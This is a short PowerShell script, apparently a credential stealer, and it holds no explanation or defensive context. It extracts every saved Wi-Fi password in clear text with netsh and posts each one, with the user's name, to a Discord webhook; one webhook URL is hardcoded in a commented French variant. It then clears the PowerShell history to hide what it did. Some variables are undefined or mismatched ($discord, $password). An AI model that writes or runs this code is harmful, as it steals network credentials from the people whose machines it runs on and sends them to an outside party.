#$hookUrl = 'https://discord.com/api/webhooks/1199934711842213888/BLnl0kifTKXpl5uI9BowlwhNzPKrE8aLRiCabj9qlrK-Qe18P_mma4-9SWSWWsVR-2KW'
#
## FR
#netsh wlan show profile | Select-String '(?<=Profil Tous les utilisateurs\s+:\s).+' | ForEach-Object {
#    $wlan  = $_.Matches.Value
#    $user = $env:username + " | " + $wlan
#    $pass = netsh wlan show profile $wlan key=clear | Select-String '(?<=Contenu de la cl.\s+:\s).+'
#
#    Write-Output $user
#    Write-Output $password
#	$payload = [PSCustomObject]@{
#	    username = $user
#	    content = [string]$pass
#	}
#
#	Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json; charset=iso-8859-5'
#}
#
#Clear-History



# ENG
netsh wlan show profile | Select-String '(?<=Profil Tous les utilisateurs\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Contenu de la cl.\s+:\s).+'

	$Body = @{
		'username' = $env:username + " | " + [string]$wlan
		'content' = [string]$passw
	}
	
	Invoke-RestMethod -ContentType 'Application/Json; charset=iso-8859-5' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
}

# Clear the PowerShell command history
Clear-History
